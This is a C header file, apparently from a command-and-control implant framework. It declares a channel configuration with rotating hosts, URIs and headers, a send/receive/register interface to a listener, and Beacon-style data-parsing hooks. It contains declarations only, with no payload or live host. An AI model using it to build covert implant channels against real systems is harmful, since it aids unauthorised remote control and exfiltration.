#ifndef _CHANNEL_H_
#define _CHANNEL_H_

#include "imports.h"
#include "tcg.h"

typedef struct {
    DWORD ID;

    WORD  RotationStrategy;
    DWORD HostIndex;
    DWORD UriIndex;
    CHAR* UserAgent;
    CHAR* Method;

    CHAR** Hosts;
    WORD*  Ports;
    DWORD  HostsCount;

    CHAR** Uris;
    CHAR** Headers;
    DWORD  UrisCount;
    DWORD  HeadersCount;
} CHANNEL_CONFIG, *PCHANNEL_CONFIG;

typedef struct {
    CHAR*          Data;
    DWORD          Size;
    CHANNEL_CONFIG Config;
} CHANNEL_CONTEXT;

// IChannel channel interface
//
typedef struct {
    DWORD            ID;
    CHANNEL_CONTEXT* Context;
    DWORD            ContextSize;
    /**
     * @brief used by the implant when registring or switching channels.
     * @param Context channel context.
     * @return TRUE if the operation succeeds, otherwise FALSE.
     */
    BOOL ( *Initialize )( CHANNEL_CONTEXT* Context );

    /**
     * @brief used by the implant to send data to the listener.
     * @param Context 	channel context.
     * @param Data 		data implant want to send
     * @param Size 		data size
     * @param Register 	TRUE if this a registration request, otherwise FALSE.
     * @return TRUE if the operation succeeds, otherwise FALSE.
     */
    BOOL ( *Send )( CHANNEL_CONTEXT* Context, CONST CHAR* Data, DWORD Size, BOOL Register );

    /**
     * @brief used by the implant to receive data from the listener.
     * @param Context 	channel context.
     * @param Data 		received data
     * @param Size 		received data size
     * @return TRUE if the operation succeeds, otherwise FALSE.
     */
    BOOL ( *Receive )( CHANNEL_CONTEXT* Context, CHAR** Data, DWORD* Size );

    /**
     * @brief used by the implant when removing or switching channels.
     * @param Context channel context.
     * @return TRUE if the operation succeeds, otherwise FALSE.
     */
    BOOL ( *Cleanup )( CHANNEL_CONTEXT* Context );
} IChannel;

// IImplant interface
//

typedef struct {
    char* original; /* the original buffer [so we can free it] */
    char* buffer;   /* current pointer into our buffer */
    int   length;   /* remaining length of data */
    int   size;     /* total size of this buffer */
} datap;

typedef struct {
    DWORD SessionID; // Implant session id

    void ( *BeaconDataParse )( datap* parser, char* buffer, int size );
    int ( *BeaconDataInt )( datap* parser );
    short ( *BeaconDataShort )( datap* parser );
    int ( *BeaconDataLength )( datap* parser );
    char* ( *BeaconDataExtract )( datap* parser, int* size );

} IImplant;

#endif // _CHANNEL_H_
